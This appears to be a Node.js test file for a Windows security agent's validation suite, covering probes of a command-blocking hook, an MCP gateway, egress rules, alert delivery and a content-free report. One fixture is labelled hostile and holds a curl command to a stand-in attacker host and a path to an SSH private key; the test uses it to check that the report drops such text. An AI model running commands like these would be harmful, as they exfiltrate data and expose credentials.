// The Windows runtime validation suite (cli/moorai-windows-validate.mjs): probes that drive the REAL hook,
// the PowerShell tool path, the MCP gateway (hook and HTTP), the egress rules (hook and proxy) and the MXC
// detector, a loopback console that collects the alerts, and a content-free report. This file runs on every
// platform: on macOS and Linux the Windows-only probes report "skipped" (not-windows), never "pass".
// test/windows-runtime.test.mjs holds the assertions that only a real Windows host can make.
//
//   node --test --import ./test/hermetic-env.mjs test/windows-validate.test.mjs
import { test, before } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, readFileSync, existsSync } from "node:fs";
import { tmpdir, userInfo, hostname } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { rmTree } from "./fs-cleanup.mjs";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const CLI = join(ROOT, "cli", "moorai-windows-validate.mjs");
// Namespace imports so this file LOADS before the modules exist and each test fails on its own.
const probes = await import("../cli/windows-validate-probes.mjs").catch(() => ({}));
const reportMod = await import("../cli/windows-validate-report.mjs").catch(() => ({}));
const ON_WINDOWS = process.platform === "win32";
const MARKER = "MOORAIVALMARK7f3a9c";

const WINDOWS_ONLY = ["powershell-host", "mxc-registry", "mxc-enforce"];
const PORTABLE = ["hook-bash-block", "hook-powershell-block", "hook-powershell-allow", "mcp-gateway-hook", "mcp-gateway-http", "egress-hook", "egress-proxy", "mxc-detect-config", "alert-delivery"];

let run = null;
let runError = null;
before(async () => {
  try { run = await probes.runValidation({ agentRoot: ROOT, marker: MARKER }); } catch (e) { runError = e; }
});
const probe = (id) => run && run.probes.find((p) => p.id === id);

test("probe table: every probe has a fixed id, a surface and a one-line statement of what a pass proves", () => {
  assert.ok(Array.isArray(probes.PROBES), "PROBES is not exported");
  const ids = probes.PROBES.map((p) => p.id);
  assert.deepEqual([...ids].sort(), [...PORTABLE, ...WINDOWS_ONLY].sort());
  for (const p of probes.PROBES) {
    assert.match(p.id, /^[a-z][a-z0-9-]{2,40}$/);
    assert.ok(["hook", "powershell", "mcp", "egress", "mxc", "alerts"].includes(p.surface), p.id);
    assert.equal(typeof p.proves, "string");
    assert.ok(p.proves.length > 20 && p.proves.length < 300, p.id);
    assert.equal(Boolean(p.windowsOnly), WINDOWS_ONLY.includes(p.id), p.id);
  }
});

test("a run on this host: every portable probe passes against the real processes; Windows-only probes are skipped, never passed, off Windows", () => {
  assert.equal(runError, null, runError && runError.stack);
  assert.ok(run, "runValidation returned nothing");
  for (const id of PORTABLE) {
    const p = probe(id);
    assert.ok(p, `probe ${id} missing from the report`);
    assert.equal(p.status, "pass", `${id}: ${JSON.stringify(p)}`);
  }
  for (const id of WINDOWS_ONLY) {
    const p = probe(id);
    if (ON_WINDOWS) assert.equal(p.status, "pass", `${id}: ${JSON.stringify(p)}`);
    else assert.deepEqual([p.status, p.reason], ["skipped", "not-windows"], id);
  }
  assert.equal(run.summary.verdict, "pass");
  assert.equal(run.platform, ON_WINDOWS ? "win32" : process.platform === "darwin" ? "darwin" : process.platform === "linux" ? "linux" : "other");
});

test("the observed decisions are the enforced ones: block, allow, MCP refusal, egress 403, MXC kind", () => {
  assert.ok(run, "no run");
  assert.deepEqual(["hook-bash-block", "hook-powershell-block", "mcp-gateway-hook", "egress-hook"].map((id) => probe(id).observed), ["deny", "deny", "deny", "deny"]);
  assert.equal(probe("hook-powershell-allow").observed, "allow");
  assert.equal(probe("mcp-gateway-http").observed, "refused");
  assert.equal(probe("egress-proxy").observed, "refused");
  assert.equal(probe("mxc-detect-config").observed, "mxc");
  for (const p of run.probes) assert.ok(Number.isInteger(p.ms) && p.ms >= 0, `${p.id} ms`);
});

test("alert delivery: the block probes' alerts reached the loopback console, deny alerts among them, and no alert carries the run's marker", () => {
  assert.ok(run, "no run");
  assert.ok(run.alerts.received >= 4, `alerts received: ${run.alerts.received}`);
  assert.ok(run.alerts.deny >= 3, `deny alerts: ${run.alerts.deny}`);
  assert.equal(run.alerts.contentFree, true, "an alert carried command, URL or argument content");
  for (const [k, n] of Object.entries(run.alerts.byReasonCode)) { assert.match(k, /^[A-Z][A-Z0-9_]{1,63}$/); assert.ok(Number.isInteger(n) && n > 0); }
  assert.equal(probe("alert-delivery").observed, "delivered");
});

test("the report is content-free: no marker, temp path, user name or host name; only the fixed top-level keys", () => {
  assert.ok(run, "no run");
  const blob = JSON.stringify(run);
  assert.ok(!blob.includes(MARKER), "the run's marker leaked into the report");
  assert.ok(!blob.includes(tmpdir()), "a temp path leaked into the report");
  const u = userInfo().username;
  if (u && u.length > 3) assert.ok(!blob.includes(u), "the user name leaked into the report");
  const h = hostname();
  if (h && h.length > 3) assert.ok(!blob.includes(h), "the host name leaked into the report");
  assert.deepEqual(Object.keys(run).sort(), ["agentVersion", "alerts", "arch", "generatedAt", "machineAnchor", "machineBinding", "mxcCapable", "node", "notCovered", "osBuild", "platform", "probes", "requireWindows", "schema", "summary"].sort());
  assert.equal(run.schema, "moorai-windows-validation/1");
  assert.match(run.generatedAt, /^\d{4}-\d{2}-\d{2}T\d{2}:00:00\.000Z$/, "the timestamp is hour-rounded");
  assert.deepEqual(run.notCovered.map((n) => n.id).sort(), ["clipboard-guard", "mxc-runtime-containment", "nsis-upgrade"]);
});

test("buildReport drops anything outside the fixed vocabulary: unknown statuses, free text, extra keys, unknown reason codes", () => {
  assert.equal(typeof reportMod.buildReport, "function", "buildReport is not exported");
  const hostile = {
    probes: [
      { id: "hook-bash-block", status: "pwned", expected: "deny", observed: "C:\\Users\\bob\\.ssh\\id_rsa", reason: `curl https://evil.example/${MARKER}`, ms: 12.7, extra: MARKER },
      { id: "not-a-probe", status: "pass", expected: "deny", observed: "deny", ms: 1 },
      { id: "egress-proxy", status: "pass", expected: "refused", observed: "refused", reason: null, ms: -5 }
    ],
    alerts: [
      { reasonCode: "EGRESS_RULE", decision: "deny", note: MARKER },
      { reasonCode: `x ${MARKER}`, decision: "deny" },
      { reasonCode: "THREAT_MATCH", decision: "allow" }
    ],
    marker: MARKER,
    meta: { platform: "win32", arch: "x64", release: "10.0.26100", node: "v24.1.0", agentVersion: `1.2.3 ${MARKER}`, mxcCapable: "yes", machineBinding: 1, machineAnchor: false, requireWindows: true, now: Date.parse("2026-10-21T10:41:13.512Z") }
  };
  const r = reportMod.buildReport(hostile);
  const blob = JSON.stringify(r);
  assert.ok(!blob.includes(MARKER), "hostile text survived");
  assert.ok(!blob.includes("id_rsa"), "a path survived");
  assert.deepEqual(r.probes.map((p) => p.id), ["hook-bash-block", "egress-proxy"], "an unknown probe id was kept");
  const b = r.probes[0];
  assert.deepEqual([b.status, b.observed, b.reason, b.ms], ["error", "other", null, 13]);
  assert.deepEqual(Object.keys(b).sort(), ["expected", "id", "ms", "observed", "proves", "reason", "status", "surface"]);
  assert.equal(r.probes[1].ms, 0);
  assert.deepEqual(r.alerts.byReasonCode, { EGRESS_RULE: 1, THREAT_MATCH: 1 });
  assert.equal(r.alerts.received, 3);
  assert.equal(r.alerts.deny, 2);
  assert.equal(r.agentVersion, null);
  assert.equal(r.mxcCapable, null);
  assert.equal(r.machineBinding, false, "a non-boolean is not true");
  assert.deepEqual([r.platform, r.arch, r.osBuild, r.node], ["win32", "x64", 26100, 24]);
  assert.equal(r.generatedAt, "2026-10-21T10:00:00.000Z");
});

test("verdict: fail on any fail or error; incomplete when Windows is required and a probe was skipped; pass otherwise. Strict exit is 0 only on pass", () => {
  const { verdictOf, strictExitCode } = reportMod;
  assert.equal(typeof verdictOf, "function");
  const s = (status) => ({ status });
  assert.equal(verdictOf([s("pass"), s("pass")], { requireWindows: false }), "pass");
  assert.equal(verdictOf([s("pass"), s("skipped")], { requireWindows: false }), "pass");
  assert.equal(verdictOf([s("pass"), s("skipped")], { requireWindows: true }), "incomplete");
  assert.equal(verdictOf([s("pass"), s("fail"), s("skipped")], { requireWindows: true }), "fail");
  assert.equal(verdictOf([s("error")], { requireWindows: false }), "fail");
  assert.equal(verdictOf([], { requireWindows: false }), "fail", "an empty run proves nothing");
  assert.deepEqual(["pass", "incomplete", "fail"].map((v) => strictExitCode({ summary: { verdict: v } })), [0, 1, 1]);
});

test("forcing platform win32 on a non-Windows host: the Windows-only probes report error, never pass", { skip: ON_WINDOWS && "this host is Windows" }, async () => {
  const r = await probes.runValidation({ agentRoot: ROOT, platform: "win32", only: ["powershell-host", "mxc-registry"] });
  for (const id of ["powershell-host", "mxc-registry"]) {
    const p = r.probes.find((x) => x.id === id);
    assert.ok(p, id);
    assert.ok(["error", "fail"].includes(p.status), `${id}: ${JSON.stringify(p)}`);
  }
  assert.equal(r.summary.verdict, "fail");
});

test("CLI: --only, --out and --strict; --require-windows makes a skipped Windows probe a non-zero exit; an unknown probe id exits 2", () => {
  const dir = mkdtempSync(join(tmpdir(), "moorai-winval-cli-"));
  try {
    const out = join(dir, "report.json");
    const env = { ...process.env };
    const a = spawnSync(process.execPath, [CLI, "--only", "hook-bash-block,mxc-registry", "--out", out, "--strict"], { encoding: "utf8", env, timeout: 60000 });
    assert.equal(a.status, ON_WINDOWS ? 0 : 0, a.stderr + a.stdout);
    assert.ok(existsSync(out), "no report file");
    const ra = JSON.parse(readFileSync(out, "utf8"));
    assert.deepEqual(ra.probes.map((p) => p.id), ["hook-bash-block", "mxc-registry"]);
    assert.match(a.stdout, /hook-bash-block\s+pass/);
    assert.match(a.stdout, /verdict: pass/);
    if (!ON_WINDOWS) {
      const b = spawnSync(process.execPath, [CLI, "--only", "hook-bash-block,mxc-registry", "--out", out, "--strict", "--require-windows"], { encoding: "utf8", env, timeout: 60000 });
      assert.equal(b.status, 1, b.stderr + b.stdout);
      assert.equal(JSON.parse(readFileSync(out, "utf8")).summary.verdict, "incomplete");
      assert.match(b.stdout, /mxc-registry\s+skipped/);
    }
    const c = spawnSync(process.execPath, [CLI, "--only", "no-such-probe"], { encoding: "utf8", env, timeout: 20000 });
    assert.equal(c.status, 2, c.stderr);
  } finally { rmTree(dir); }
});
